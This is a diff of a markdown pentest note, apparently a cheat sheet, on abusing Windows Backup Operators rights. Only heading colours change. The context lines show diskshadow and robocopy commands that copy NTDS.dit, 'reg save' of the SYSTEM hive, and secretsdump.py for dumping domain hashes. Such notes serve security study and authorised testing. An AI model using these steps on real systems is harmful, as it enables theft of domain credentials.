@@ -1,10 +1,10 @@
-# <span style="color:lightblue">Backup Operators (Disk shadow + Robocopy)</span>
+# <span style="color:#FF5555">Backup Operators (Disk shadow + Robocopy)</span>
 
-## <span style="color:lightgreen">Methodology</span>
+## <span style="color:#8BE9FD">Methodology</span>
 
 If the user is a part of the Backup Operator group, the user has the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file.
 
-## <span style="color:lightgreen">Detection</span>
+## <span style="color:#8BE9FD">Detection</span>
 
 1. The user should be a part of the Backup Operators group and should have  SeBackupPrivilege and SeRestorePrivilege Enabled
 
@@ -13,9 +13,9 @@ C:\Temp> net user unsername-here
 C:\Temp> whoami /all
 ```
 
-## <span style="color:lightgreen">Exploitation</span>
+## <span style="color:#8BE9FD">Exploitation</span>
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 1. Create this script and transfer it to Windows VM
 
 ```powershell
@@ -30,7 +30,7 @@ expose %cdrive% E:X
 end backupX
 ```
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. Pass the script to **diskshadow unility** to create the shadow copy
 ```powershell
@@ -45,7 +45,7 @@ PS C:\Temp> robocopy /b E:\Windows\ntds . ntds.dit
 PS C:\Temp> reg save hklm\system c:\temp\system.hive
 ```
 
-### Dumping NTML Hashes
+### <span style="color:#50FA7B">Dumping NTML Hashes</span>
 
 1. We can use `secretsdump.py` do decrypt the DA creds on Kali VM
 
